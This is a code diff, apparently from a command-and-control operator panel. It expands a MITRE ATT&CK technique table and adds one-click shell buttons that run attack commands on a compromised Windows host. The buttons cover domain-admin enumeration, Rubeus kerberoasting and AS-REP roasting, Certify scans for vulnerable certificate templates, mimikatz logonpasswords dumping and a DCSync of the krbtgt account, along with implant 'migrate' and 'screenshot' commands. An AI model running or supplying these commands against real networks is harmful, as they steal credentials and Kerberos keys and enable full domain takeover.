@@ -61,25 +61,42 @@ TECH_META: dict[str, dict] = {
     "T1649":     {"name": "Shadow Credentials",    "tactic": "Credential Access"},
     "T1555":     {"name": "Password Stores",       "tactic": "Credential Access"},
     "T1555.003": {"name": "Chrome Creds",          "tactic": "Credential Access"},
-    "T1033":     {"name": "User Discovery",        "tactic": "Discovery"},
-    "T1082":     {"name": "System Info",           "tactic": "Discovery"},
-    "T1087":     {"name": "Account Discovery",     "tactic": "Discovery"},
-    "T1087.002": {"name": "Domain Accounts",       "tactic": "Discovery"},
-    "T1069.001": {"name": "Local Groups",          "tactic": "Discovery"},
-    "T1069.002": {"name": "Domain Groups",         "tactic": "Discovery"},
-    "T1016":     {"name": "Network Config",        "tactic": "Discovery"},
-    "T1057":     {"name": "Process Discovery",     "tactic": "Discovery"},
-    "T1049":     {"name": "Network Connections",   "tactic": "Discovery"},
-    "T1083":     {"name": "File Discovery",        "tactic": "Discovery"},
-    "T1012":     {"name": "Query Registry",        "tactic": "Discovery"},
-    "T1018":     {"name": "Remote Sys Discovery",  "tactic": "Discovery"},
-    "T1482":     {"name": "Domain Trust",          "tactic": "Discovery"},
-    "T1021":     {"name": "Remote Services",       "tactic": "Lateral Movement"},
-    "T1090":     {"name": "Proxy",                 "tactic": "Lateral Movement"},
-    "T1090.003": {"name": "Multi-hop Proxy",       "tactic": "Lateral Movement"},
-    "T1113":     {"name": "Screen Capture",        "tactic": "Collection"},
-    "T1041":     {"name": "Exfil over C2",         "tactic": "Exfiltration"},
-    "T1105":     {"name": "Ingress Tool Transfer", "tactic": "Command and Control"},
+    "T1033":     {"name": "User Discovery",          "tactic": "Discovery"},
+    "T1082":     {"name": "System Info",             "tactic": "Discovery"},
+    "T1087":     {"name": "Account Discovery",       "tactic": "Discovery"},
+    "T1087.002": {"name": "Domain Accounts",         "tactic": "Discovery"},
+    "T1069.001": {"name": "Local Groups",            "tactic": "Discovery"},
+    "T1069.002": {"name": "Domain Groups",           "tactic": "Discovery"},
+    "T1016":     {"name": "Network Config",          "tactic": "Discovery"},
+    "T1057":     {"name": "Process Discovery",       "tactic": "Discovery"},
+    "T1049":     {"name": "Network Connections",     "tactic": "Discovery"},
+    "T1083":     {"name": "File Discovery",          "tactic": "Discovery"},
+    "T1012":     {"name": "Query Registry",          "tactic": "Discovery"},
+    "T1018":     {"name": "Remote Sys Discovery",    "tactic": "Discovery"},
+    "T1482":     {"name": "Domain Trust",            "tactic": "Discovery"},
+    # Credential Access — Kerberos
+    "T1558.001": {"name": "Golden Ticket",           "tactic": "Credential Access"},
+    "T1558.002": {"name": "Silver Ticket",           "tactic": "Credential Access"},
+    "T1558.003": {"name": "Kerberoasting",           "tactic": "Credential Access"},
+    "T1558.004": {"name": "AS-REP Roasting",         "tactic": "Credential Access"},
+    # Credential Access — Dumping
+    "T1003.001": {"name": "LSASS Memory",            "tactic": "Credential Access"},
+    "T1003.002": {"name": "SAM Dump",                "tactic": "Credential Access"},
+    "T1003.006": {"name": "DCSync",                  "tactic": "Credential Access"},
+    # Defense Evasion / Lateral
+    "T1550.003": {"name": "Pass the Ticket",         "tactic": "Defense Evasion"},
+    "T1021.002": {"name": "SMB/Windows Admin Shares","tactic": "Lateral Movement"},
+    "T1021.006": {"name": "WMI Lateral Movement",   "tactic": "Lateral Movement"},
+    "T1021":     {"name": "Remote Services",         "tactic": "Lateral Movement"},
+    "T1090":     {"name": "Proxy",                   "tactic": "Lateral Movement"},
+    "T1090.003": {"name": "Multi-hop Proxy",         "tactic": "Lateral Movement"},
+    "T1039":     {"name": "File Share Collection",   "tactic": "Collection"},
+    "T1113":     {"name": "Screen Capture",          "tactic": "Collection"},
+    "T1041":     {"name": "Exfil over C2",           "tactic": "Exfiltration"},
+    "T1105":     {"name": "Ingress Tool Transfer",   "tactic": "Command and Control"},
+    "T1557.001": {"name": "LLMNR/NTLM Relay",       "tactic": "Credential Access"},
+    "T1505.001": {"name": "SQL Stored Procedures",   "tactic": "Execution"},
+    "T1134.002": {"name": "Create Process w/Token",  "tactic": "Privilege Escalation"},
 }
 
 # ── API helpers ───────────────────────────────────────────────────────────────
@@ -980,21 +997,35 @@ input[type=text]:focus { outline:none; border-color:var(--red); }
           <!-- Shell tab -->
           <div id="tab-shell">
             <div class="quick-bar">
-              <span class="qlabel">QUICK▸</span>
+              <span class="qlabel">HOST▸</span>
               <button class="qbtn" onclick="qi('whoami /all')">whoami /all</button>
               <button class="qbtn" onclick="qi('hostname')">hostname</button>
-              <button class="qbtn" onclick="qi('ipconfig /all')">ipconfig /all</button>
-              <button class="qbtn" onclick="qi('net user /domain')">net user /dom</button>
-              <button class="qbtn" onclick="qi('net group \"Domain Admins\" /domain')">dom admins</button>
-              <button class="qbtn" onclick="qi('nltest /domain_trusts')">dom trusts</button>
-              <button class="qbtn" onclick="qi('arp -a')">arp -a</button>
+              <button class="qbtn" onclick="qi('ipconfig /all')">ipconfig</button>
+              <button class="qbtn" onclick="qi('systeminfo')">sysinfo</button>
               <button class="qbtn" onclick="qi('tasklist /v')">tasklist</button>
               <button class="qbtn" onclick="qi('netstat -ano')">netstat</button>
-              <button class="qbtn" onclick="qi('net share')">net share</button>
-              <button class="qbtn" onclick="qi('wmic os get Caption,Version /format:list')">os info</button>
-              <button class="qbtn" onclick="qi('reg query HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall /s /v DisplayName 2>nul | findstr /i DisplayName')">installed</button>
+              <button class="qbtn" onclick="qi('net share')">shares</button>
+              <button class="qbtn" onclick="qi('arp -a')">arp</button>
               <button class="qbtn" onclick="qi('migrate')">migrate</button>
               <button class="qbtn" onclick="qi('screenshot')">screenshot</button>
+              <span class="qlabel" style="margin-left:8px">AD▸</span>
+              <button class="qbtn" onclick="qi('net user /domain')">users</button>
+              <button class="qbtn" onclick="qi('net group \"Domain Admins\" /domain')">DA</button>
+              <button class="qbtn" onclick="qi('net group \"Enterprise Admins\" /domain')">EA</button>
+              <button class="qbtn" onclick="qi('nltest /domain_trusts /all_trusts')">trusts</button>
+              <button class="qbtn" onclick="qi('nltest /dclist:')">DCs</button>
+              <button class="qbtn" onclick="qi('wmic os get Caption,Version,BuildNumber /format:list')">os</button>
+              <span class="qlabel" style="margin-left:8px">KERBEROS▸</span>
+              <button class="qbtn" onclick="qi('Rubeus triage')">triage</button>
+              <button class="qbtn" onclick="qi('Rubeus kerberoast /outfile:hashes.txt /nowrap')">kerberoast</button>
+              <button class="qbtn" onclick="qi('Rubeus asreproast /format:hashcat /nowrap')">asreproast</button>
+              <button class="qbtn" onclick="qi('Certify find /vulnerable')">ADCS</button>
+              <button class="qbtn" onclick="qi('Whisker list')">shadow creds</button>
+              <button class="qbtn" onclick="qi('SharpView Get-DomainUser -SPN')">SPNs</button>
+              <button class="qbtn" onclick="qi('SharpView Get-ObjectAcl -ResolveGUIDs | ? {$_.ActiveDirectoryRights -match \"GenericAll|WriteDacl|WriteOwner\"}')">ACLs</button>
+              <button class="qbtn" onclick="qi('SharpLAPS /host:')">LAPS</button>
+              <button class="qbtn" onclick="qi('mimikatz sekurlsa::logonpasswords exit')">sekurlsa</button>
+              <button class="qbtn" onclick="qi('mimikatz lsadump::dcsync /user:krbtgt exit')">dcsync</button>
             </div>
             <div id="shell-out"></div>
             <div id="shell-input-bar">
